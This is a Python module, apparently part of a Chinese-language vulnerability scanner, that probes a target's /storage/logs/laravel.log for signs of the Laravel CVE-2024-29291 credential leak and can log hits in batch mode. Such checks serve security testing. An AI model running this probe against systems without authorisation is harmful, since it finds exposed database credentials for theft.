#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.reqset import ReqSet
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
urllib3.disable_warnings()

class Cve_2024_29291:
    def run(self,url):
        url2 = url+"/storage/logs/laravel.log"
        try:
            req = requests.post(url2,headers={"User-Agent":self.headers},verify=self.ssl,proxies=self.proxy)
            if "PDO->__construct" in req.text:
                OutPrintInfoSuc("Laravel", f'存在Laravel CVE-2024-29291凭据泄漏漏洞 {url2}')

                if self.batch:
                    with open("./result/laravel_2024_29291.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Laravel", '不存在Laravel CVE-2024-29291凭据泄漏漏洞')
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Laravel", '不存在Laravel CVE-2024-29291凭据泄漏漏洞')
            return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Laravel", '开始执行Laravel CVE-2024-29291凭据泄漏漏洞')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Laravel", 'Laravel CVE-2024-29291凭据泄漏漏洞检测结束')